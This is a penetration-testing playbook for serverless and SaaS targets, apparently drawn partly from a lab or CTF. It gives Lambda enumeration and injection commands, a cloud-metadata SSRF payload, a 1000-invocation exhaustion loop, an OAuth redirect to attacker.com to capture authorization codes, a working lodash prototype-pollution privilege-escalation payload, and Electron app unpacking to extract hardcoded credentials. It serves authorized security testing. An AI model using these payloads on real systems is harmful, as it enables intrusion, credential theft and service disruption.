# Cross-Cloud — Serverless + SaaS Testing

## When this applies

- Target uses Lambda / Azure Functions / Google Cloud Functions for backend logic.
- SaaS-style applications with OAuth / subdomain takeover risk.
- Goal: enumerate functions, test for injection / SSRF, audit OAuth flows.

## Technique

For serverless: list functions, inspect environment variables, invoke with malicious payloads (command injection, SSRF, resource exhaustion). For SaaS: enumerate subdomains, test OAuth flows for redirect_uri / scope / state weaknesses.

## Steps

### Common serverless vulnerabilities

- **Function Injection**: Code injection in functions
- **Excessive Permissions**: Over-privileged IAM roles
- **Secrets Exposure**: Hardcoded credentials
- **Event Injection**: Malicious event data
- **Dependency Vulnerabilities**: Outdated packages
- **Resource Exhaustion**: DoS via function invocations

### AWS Lambda testing

```bash
# List functions
aws lambda list-functions

# Get function details
aws lambda get-function --function-name function-name

# Get function configuration
aws lambda get-function-configuration --function-name function-name

# Invoke function
aws lambda invoke --function-name function-name --payload '{"key":"value"}' output.txt

# Get function policy
aws lambda get-policy --function-name function-name

# Check environment variables (may contain secrets)
aws lambda get-function-configuration --function-name name | jq .Environment

# Download function code
aws lambda get-function --function-name name --query 'Code.Location' --output text
```

### Testing for vulnerabilities

```bash
# Injection testing
# Invoke with malicious payloads
aws lambda invoke --function-name function-name \
  --payload '{"command": "cat /etc/passwd"}' output.txt

# SSRF testing
aws lambda invoke --function-name function-name \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/"}' output.txt

# Resource exhaustion
for i in {1..1000}; do
  aws lambda invoke --function-name function-name output-$i.txt &
done
```

### SaaS — common issues

- **OAuth Misconfigurations**: Improper OAuth implementation
- **API Security**: Weak API authentication/authorization
- **Data Exposure**: Publicly accessible data
- **Subdomain Takeovers**: Abandoned DNS entries
- **Third-party Integrations**: Insecure integrations

### Subdomain enumeration

```bash
# subfinder
subfinder -d target.com -o subdomains.txt

# amass
amass enum -d target.com

# Check for takeover possibilities
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
```

### OAuth testing

```bash
# Test redirect_uri manipulation
# Original: ?redirect_uri=https://app.example.com/callback
# Test: ?redirect_uri=https://attacker.com/callback

# Test state parameter
# Missing state = CSRF vulnerability

# Test scope escalation
# Request: scope=read
# Try: scope=read write admin
```

### SaaS testing methodology

1. Enumerate subdomains and services
2. Test OAuth flows
3. API security testing
4. Check for subdomain takeovers
5. Review third-party integrations
6. Test data access controls
7. Check for information disclosure

### Lodash `_.merge` prototype pollution — `constructor.prototype` variant

**Symptom:** `__proto__` injection appears to land (`{"ok": true}`) but the polluted property isn't visible to subsequent code.

**Cause:** Newer lodash (≥ 4.17.5) sanitizes the literal key `__proto__` but still merges `constructor.prototype.<key>`.

**Working payload:**
```json
{"auth": {...}, "message": {"constructor": {"prototype": {"canUpload": true}}}}
```

After this single PUT, every plain object in the Node process has `canUpload === true` via prototype-chain lookup, so `findUser(...)` returns a user that *passes* `if (!user.canUpload)` checks. Pattern: upgrade a low-privilege user (e.g., a message-poster) into an authenticated upload endpoint by polluting an authorization-flag property checked downstream.

### Electron Asar reversal pattern

For "download our desktop client" attack patterns:
1. `unobtainium_debian.zip` → `7z x` → `dpkg-deb -X` (or `7z x data.tar.xz`) → `app.asar`.
2. `npx @electron/asar extract app.asar app/` exposes JS sources, including hardcoded `auth: {name, password}` and the API hostname.
3. The desktop client's API endpoint (port 31337 / 8443 / etc.) is the real attack surface; the Electron app is just a discovery vehicle for credentials and the prototype-pollution / cmd-injection sinks documented in its source.

## Verifying success

- Lambda command-injection payload returns `/etc/passwd` content.
- OAuth redirect_uri to attacker.com captures the authorization code.
- Subdomain takeover succeeds — registered the dangling CNAME target.

## Common pitfalls

- Lambda payloads must match the function's expected event schema — invalid JSON triggers failure.
- OAuth flows often have multiple redirect_uri whitelists; only the production one matters.
- Subdomain takeover requires the target SaaS provider to allow re-registration of the same name.

## Tools

- aws lambda CLI, gcloud functions, az functionapp
- subfinder, amass, subjack
- Burp OAuth analyzer extensions
- @electron/asar, 7z, dpkg-deb
